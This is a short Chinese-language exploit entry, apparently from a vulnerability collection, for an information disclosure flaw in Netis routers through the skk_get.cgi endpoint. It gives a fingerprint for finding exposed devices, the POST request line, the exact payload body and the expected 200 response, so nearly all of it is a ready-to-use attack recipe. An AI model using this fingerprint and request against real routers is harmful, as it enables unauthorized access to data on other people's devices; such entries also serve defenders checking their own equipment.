# Netis路由器skk_get.cgi信息泄露漏洞

Netis ｜ 信息泄露 ｜ —
- **指纹**：`app="netis-Server"`
- **请求**：`POST /cgi-bin/skk_get.cgi HTTP/1.1`

**Payload**
```
mode_name=skk_get&wl_link=0
```
- **响应特征**：200